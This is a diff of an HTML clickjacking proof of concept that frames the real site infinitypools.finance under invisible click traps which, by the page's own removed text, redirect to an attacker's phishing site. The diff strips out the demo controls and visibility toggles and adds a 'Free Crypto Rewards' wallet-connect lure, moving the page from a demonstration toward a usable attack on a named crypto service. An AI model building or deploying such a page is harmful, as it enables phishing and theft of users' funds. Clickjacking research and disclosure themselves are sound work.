@@ -30,43 +30,6 @@
             z-index: 99999;
         }
 
-        .demo-controls {
-            position: fixed;
-            bottom: 20px;
-            right: 20px;
-            background: white;
-            padding: 15px;
-            border-radius: 10px;
-            box-shadow: 0 5px 20px rgba(0,0,0,0.3);
-            z-index: 99999;
-        }
-
-        .demo-controls button {
-            display: block;
-            width: 100%;
-            margin: 5px 0;
-            padding: 10px;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-            font-weight: bold;
-        }
-
-        .show-overlay {
-            background: #28a745;
-            color: white;
-        }
-
-        .hide-overlay {
-            background: #dc3545;
-            color: white;
-        }
-
-        .show-traps {
-            background: #ffc107;
-            color: #333;
-        }
-
         .container {
             padding-top: 60px;
             max-width: 1400px;
@@ -196,18 +159,12 @@
         🔴 SECURITY RESEARCH PoC - This demonstrates clickjacking vulnerability on infinitypools.finance
     </div>
 
-    <div class="demo-controls">
-        <h4 style="margin-bottom: 10px;">Demo Controls:</h4>
-        <button class="show-overlay" onclick="showIframe()">Show Legitimate Site</button>
-        <button class="hide-overlay" onclick="hideIframe()">Hide Site (Real Attack)</button>
-        <button class="show-traps" onclick="toggleTraps()">Toggle Red Zones</button>
-        <p style="margin-top: 10px; font-size: 12px; color: #666;">
-            Click zones = Malicious links<br>
-            They redirect to attacker site
-        </p>
-    </div>
-
     <div class="container">
+        <div class="decoy-content">
+            <h1>Free Crypto Rewards</h1>
+            <p>Connect your wallet and claim your rewards!</p>
+        </div>
+
         <div class="iframe-container">
             <!-- The legitimate Infinity Pools site -->
             <iframe 
@@ -232,27 +189,6 @@
     <script>
         const iframe = document.getElementById('legitimateIframe');
         const traps = document.querySelectorAll('.click-trap');
-        let trapsVisible = false;
-
-        function showIframe() {
-            iframe.style.opacity = '0.5';
-        }
-
-        function hideIframe() {
-            iframe.style.opacity = '0';
-            alert('⚠️ REAL ATTACK MODE: The iframe is now invisible. Users see only the decoy content but clicking anywhere redirects to the attacker\'s phishing site!');
-        }
-
-        function toggleTraps() {
-            trapsVisible = !trapsVisible;
-            traps.forEach(trap => {
-                if (trapsVisible) {
-                    trap.classList.add('visible');
-                } else {
-                    trap.classList.remove('visible');
-                }
-            });
-        }
 
         // Log clicks for demonstration
         traps.forEach((trap, index) => {
